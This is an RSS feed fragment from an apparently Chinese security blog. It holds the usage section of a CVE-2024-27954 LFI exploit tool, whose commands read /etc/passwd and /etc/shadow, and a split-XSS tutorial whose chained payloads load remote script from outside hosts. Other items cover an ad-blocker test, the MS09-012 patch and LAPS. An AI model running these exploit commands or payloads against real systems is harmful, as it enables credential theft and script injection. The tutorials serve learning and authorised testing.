          &lt;td&gt;包含目标URL列表的文件(每行一个)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;--lfi-path&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;要测试的单个文件路径(默认:&lt;code&gt;/etc/passwd&lt;/code&gt;)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;--paths-file&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;包含多个文件路径的文件(每行一个)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;--proxy&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;代理设置(如&lt;code&gt;http://127.0.0.1:8080&lt;/code&gt;)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;--output&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;保存漏洞结果的输出文件&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;--threads&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;并发线程数(默认:&lt;code&gt;3&lt;/code&gt;)&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;-使用示例&#34;&gt;📂 使用示例
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 CVE-2024-27954.py --url &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://目标地址&amp;#34;&lt;/span&gt; --lfi-path /etc/passwd --proxy &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://127.0.0.1:8080&amp;#34;&lt;/span&gt; --output results.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 CVE-2024-27954.py --url &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://目标地址&amp;#34;&lt;/span&gt; --lfi-path /etc/shadow --proxy &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://127.0.0.1:8080&amp;#34;&lt;/span&gt; --output results.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;img width=&#34;1349&#34; height=&#34;433&#34; alt=&#34;扫描示例&#34; src=&#34;https://github.com/user-attachments/assets/ae898bb0-b03e-4b65-97d1-2f835744a144&#34; /&gt;
&lt;hr&gt;
&lt;h1 id=&#34;-免责声明&#34;&gt;⚠️ 免责声明
&lt;/h1&gt;&lt;p&gt;本工具仅用于教育目的和授权渗透测试。未经授权访问系统可能是非法的。请负责任地使用。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>分割XSS攻击载荷：突破20字符限制的技巧</title>
        <link>http://localhost:1313/p/%E5%88%86%E5%89%B2xss%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E7%AA%81%E7%A0%B420%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6%E7%9A%84%E6%8A%80%E5%B7%A7/</link>
        <pubDate>Sat, 02 Aug 2025 16:35:35 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%88%86%E5%89%B2xss%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E7%AA%81%E7%A0%B420%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6%E7%9A%84%E6%8A%80%E5%B7%A7/</guid>
        <description>&lt;h1 id=&#34;split-xss---分割xss攻击载荷&#34;&gt;Split XSS - 分割XSS攻击载荷
&lt;/h1&gt;&lt;h2 id=&#34;突破20字符限制的xss攻击技术&#34;&gt;突破20字符限制的XSS攻击技术
&lt;/h2&gt;&lt;p&gt;在测试一个编辑表单时，我发现8个输入字段都存在XSS漏洞，但每个字段限制为20个字符。常规XSS攻击无法在如此短的字符限制下完成，于是我开发了以下技术：&lt;/p&gt;
&lt;h3 id=&#34;基本攻击思路&#34;&gt;基本攻击思路
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;在第一个输入中开启&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;标签但不闭合：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;alert(1)/*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;在后续输入中闭合标签：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*/&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;字符分配策略&#34;&gt;字符分配策略
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;第一个字段：用12个字符闭合输入标签并开始脚本标签，剩余8个字符用于有效载荷&lt;/li&gt;
&lt;li&gt;中间字段：每字段16个有效载荷字符（扣除4个字符用于注释标记）&lt;/li&gt;
&lt;li&gt;最后字段：9个有效载荷字符（扣除11个字符用于闭合注释和脚本标签）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;实际攻击载荷示例&#34;&gt;实际攻击载荷示例
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;gt;&amp;lt;script&amp;gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;*/x=document/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;*/.createElement(/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;*/&amp;#34;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;);x./*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;*/src=&amp;#34;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//dn.lc/s&amp;#34;;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/document.head./&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/appendChild(x);/&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;/&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;组合xss技术&#34;&gt;组合XSS技术
&lt;/h2&gt;&lt;p&gt;当网站将两个输入字段组合显示时，可以：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在名字字段注入不完整的脚本标签：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;abc&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;//digi.ninja/script.js&amp;#34;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;在姓氏字段注入闭合标签：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;组合后形成完整标签：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;abc&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;//digi.ninja/script.js&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;防御措施&#34;&gt;防御措施
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;正确的输出编码是根本解决方案&lt;/li&gt;
&lt;li&gt;输入验证可以作为辅助防御层&lt;/li&gt;
&lt;li&gt;永远不要信任用户提供的内容&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://digi.ninja/labs/split_xss.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;完整测试实验室可在Split XSS Lab获取&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>使用Burp分析浏览器扩展拦截效果对比测试</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8burp%E5%88%86%E6%9E%90%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%A9%E5%B1%95%E6%8B%A6%E6%88%AA%E6%95%88%E6%9E%9C%E5%AF%B9%E6%AF%94%E6%B5%8B%E8%AF%95/</link>
        <pubDate>Sat, 02 Aug 2025 16:24:37 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8burp%E5%88%86%E6%9E%90%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%A9%E5%B1%95%E6%8B%A6%E6%88%AA%E6%95%88%E6%9E%9C%E5%AF%B9%E6%AF%94%E6%B5%8B%E8%AF%95/</guid>
        <description>&lt;h1 id=&#34;测试背景&#34;&gt;测试背景
&lt;/h1&gt;&lt;p&gt;非科学实验表明：uBlock Origin能有效阻止跟踪器发起HTTP GET请求&lt;br&gt;
&lt;strong&gt;测试扩展&lt;/strong&gt;：无插件 vs Ghostery vs uBlock Origin vs AdBlock Plus&lt;br&gt;
&lt;strong&gt;测试网站首页&lt;/strong&gt;：CNN vs FoxNews vs MSNBC&lt;/p&gt;
&lt;h1 id=&#34;测试方法&#34;&gt;测试方法
&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;每次测试前清除浏览器缓存&lt;/li&gt;
&lt;li&gt;开启新的Burp会话并关闭代理拦截&lt;/li&gt;
&lt;li&gt;使用Kali Linux下的Firefox浏览器&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;cnn测试结果&#34;&gt;CNN测试结果
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;无扩展&lt;/strong&gt;：60秒内产生335次GET请求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ghostery&lt;/strong&gt;：132次请求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;uBlock Origin&lt;/strong&gt;：102次请求（触发反广告拦截提示）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;AdBlock Plus&lt;/strong&gt;：99次请求（未触发拦截）&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;foxnews测试结果&#34;&gt;FoxNews测试结果
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;无扩展&lt;/strong&gt;：265次GET请求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ghostery&lt;/strong&gt;：67次请求（部分网站功能异常）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;uBlock Origin&lt;/strong&gt;：170次请求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;AdBlock Plus&lt;/strong&gt;：229次请求（拦截效果差）&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;msnbc测试结果&#34;&gt;MSNBC测试结果
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;无扩展&lt;/strong&gt;：301次请求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ghostery&lt;/strong&gt;：136次请求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;uBlock Origin&lt;/strong&gt;：85次请求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;AdBlock Plus&lt;/strong&gt;：140次请求&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;结论&#34;&gt;结论
&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;主流广告网络已适应AdBlock Plus的拦截规则&lt;/li&gt;
&lt;li&gt;Ghostery提供详细的跟踪器分析数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;uBlock Origin综合表现最佳&lt;/strong&gt;，能有效阻止：
&lt;ul&gt;
&lt;li&gt;浏览器指纹采集&lt;/li&gt;
&lt;li&gt;用户习惯追踪&lt;/li&gt;
&lt;li&gt;操作系统信息泄露&lt;/li&gt;
&lt;li&gt;已安装扩展探测&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;经Panopticlick验证，仅使用uBlock时防追踪效果显著。作者声明支持EFF、DuckDuckGo、uBlock团队、PrivacyBadger和Ghostery开发组。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>MS09-012补丁：修复&#34;令牌劫持&#34;漏洞的技术解析</title>
        <link>http://localhost:1313/p/ms09-012%E8%A1%A5%E4%B8%81%E4%BF%AE%E5%A4%8D%E4%BB%A4%E7%89%8C%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 16:13:46 +0800</pubDate>
        
        <guid>http://localhost:1313/p/ms09-012%E8%A1%A5%E4%B8%81%E4%BF%AE%E5%A4%8D%E4%BB%A4%E7%89%8C%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;ms09-012-修复令牌劫持漏洞&#34;&gt;MS09-012: 修复&amp;quot;令牌劫持&amp;quot;漏洞
&lt;/h1&gt;&lt;p&gt;今天早晨我们发布了MS09-012更新，用于修复公开披露的&amp;quot;令牌劫持&amp;quot;漏洞(&lt;a class=&#34;link&#34; href=&#34;http://www.argeniss.com/research/TokenKidnapping.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://www.argeniss.com/research/TokenKidnapping.pdf&lt;/a&gt;)。该漏洞允许从Network Service账户提权至Local System账户。通常情况下，恶意用户不会以Network Service身份运行，除非是像IIS这样的少数程序，可以在以Network Service运行的服务中执行任意代码。这使得攻击者能够攻破并控制Windows系统。&lt;/p&gt;
&lt;h2 id=&#34;我是否受影响&#34;&gt;我是否受影响？
&lt;/h2&gt;&lt;p&gt;此问题影响两种情况：在Network Service账户拥有的进程中执行不受信任的代码，或在具有SeImpersonatePrivilege的进程中执行代码。公开讨论的攻击方式是通过托管在IIS工作进程中的恶意Full Trust ASPX代码实现的。&lt;/p&gt;
&lt;h2 id=&#34;技术背景&#34;&gt;技术背景
&lt;/h2&gt;&lt;p&gt;修复此问题需要微软有史以来最庞大的工程努力之一。本次安全更新涉及：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Windows内核修改&lt;/li&gt;
&lt;li&gt;COM、DCOM和LSASS子系统&lt;/li&gt;
&lt;li&gt;WMI和MSDTC内置服务&lt;/li&gt;
&lt;li&gt;服务控制管理器(SCM)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们不得不将Vista和Server 2008中的服务令牌工作大量反向移植到XP和Server 2003。部分最资深的开发人员从Windows 7开发中抽调出来处理此问题。&lt;/p&gt;
&lt;h2 id=&#34;修复的四个cve漏洞&#34;&gt;修复的四个CVE漏洞
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CVE-2008-1436 (MSDTC)&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;问题：MSDTC在创建RPC连接时请求过多权限&lt;/li&gt;
&lt;li&gt;修复：减少RPC连接时的权限请求&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CVE-2009-0079 (RPCSS)&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;问题：Network Service账户下运行服务的权限问题&lt;/li&gt;
&lt;li&gt;修复：移植Vista的Service SID功能&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CVE-2009-0080 (线程池)&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;问题：线程创建时的权限验证不足&lt;/li&gt;
&lt;li&gt;修复：强化线程访问权限&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CVE-2009-0078 (WMI)&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;问题：WMI运行Network Service和Local Service提供程序时缺乏保护&lt;/li&gt;
&lt;li&gt;修复：采用基于Vista Service SID技术的WMI SID保护机制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;未来方向&#34;&gt;未来方向
&lt;/h2&gt;&lt;p&gt;Windows 7和Server 2008 R2将引入&amp;quot;托管服务账户&amp;quot;功能，提供更灵活的解决方案：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;允许服务运行为独立账户&lt;/li&gt;
&lt;li&gt;提供自动密码管理功能&lt;/li&gt;
&lt;li&gt;简化域SPN远程认证流程&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;em&gt;本文内容&amp;quot;按原样&amp;quot;提供，不提供任何担保，也不授予任何权利。&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Nick Finco, MSRC工程团队&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>微软发布本地管理员密码解决方案(LAPS)工具</title>
        <link>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E5%8F%91%E5%B8%83%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88laps%E5%B7%A5%E5%85%B7/</link>
        <pubDate>Sat, 02 Aug 2025 16:02:32 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E5%8F%91%E5%B8%83%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88laps%E5%B7%A5%E5%85%B7/</guid>
        <description>&lt;p&gt;こんにちは、村木ゆりかです。
今回は、マイクロソフト セキュリティ アドバイザリ 3062591 でお知らせしましたツール Local Administrator Password Solution (LAPS) についてご紹介します。&lt;/p&gt;
&lt;h3 id=&#34;local-administrator-password-solution-laps-とは&#34;&gt;Local Administrator Password Solution (LAPS) とは?
&lt;/h3&gt;&lt;p&gt;このツールは、Active Directory (AD) に参加しているコンピューターの、ローカル管理者アカウントのパスワードを AD にて管理することができる無償のツールです。&lt;/p&gt;
&lt;p&gt;攻撃者が組織に侵入する際、マルウェアなどを利用してまずはひとつのドメイン端末に侵入し、その後、Pass the Hash などの手法で同一のパスワードが設定されているその他のドメイン端末へ侵入を試みるなど、徐々に認証サーバーへ侵入するのに必要な高い権限を取得保持している可能性の高いアプリケーション・サービスを狙います。企業ではマスター イメージから複製展開する手法や、ヘルプデスク業務の効率化のために端末毎の管理者アカウントが同一になることが多く、このような場合は、一台がマルウェア感染すると他のすべての端末が侵害される可能性が高くなります。このように侵害を広げていく場合、脆弱性は不要であり、正規の認証を行い、正規の方法で不正なファイルが仕掛けられます。このような組織への侵入を阻止するためには、端末ごとの管理者アカウント パスワードの使い回しをしないことが重要になります。&lt;/p&gt;
&lt;p&gt;この LAPS ツールを利用する事で、ドメイン端末のローカル管理者アカウントのパスワードをランダムなものにし、管理を行うことができます。これにより、万が一組織内への攻撃者の侵入があった場合でも、組織内への攻撃の広がりや侵入拡大を防ぐためのセキュリティを強化することができます。&lt;/p&gt;
&lt;h3 id=&#34;laps-でのパスワード更新と管理&#34;&gt;LAPS でのパスワード更新と管理
&lt;/h3&gt;&lt;p&gt;LAPS を利用することで、各ドメイン端末のローカル管理者アカウントに、自動でランダムなパスワードを設定・定期的に更新し、AD に保存することができます。また、特定の端末のローカル管理者アカウントのパスワードをリセットするなどの管理を行うことができます。もちろん、既定の Administrator 以外のローカル管理者アカウントも管理可能です。&lt;/p&gt;
&lt;p&gt;LAPS は AD 環境でグループ ポリシーを利用して管理でき、端末から AD へパスワードを保存する際には、Kerberos V5 のプロトコルを利用し、AES で暗号化しており、AD に保存されたパスワードの情報は、特定の権限を持ったユーザーでないと閲覧することができないよう ACL で管理することができます。&lt;/p&gt;
&lt;h3 id=&#34;local-administrator-password-solution-laps-の入手&#34;&gt;Local Administrator Password Solution (LAPS) の入手
&lt;/h3&gt;&lt;p&gt;LAPS ツールは、ダウンロード センターから入手できます。
利用方法や展開方法、アーキテクチャを説明したドキュメント (英語) も、同時にダウンロードできます。
また、Ignite イベントで行われたセッションで LAPS ツールの説明やデモが行われています。ぜひ、ビデオをチェックしてみてください。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>使用Python实现Google Dork SSL绕过自动搜索技术</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8python%E5%AE%9E%E7%8E%B0google-dork-ssl%E7%BB%95%E8%BF%87%E8%87%AA%E5%8A%A8%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/</link>
        <pubDate>Sat, 02 Aug 2025 15:51:22 +0800</pubDate>
        
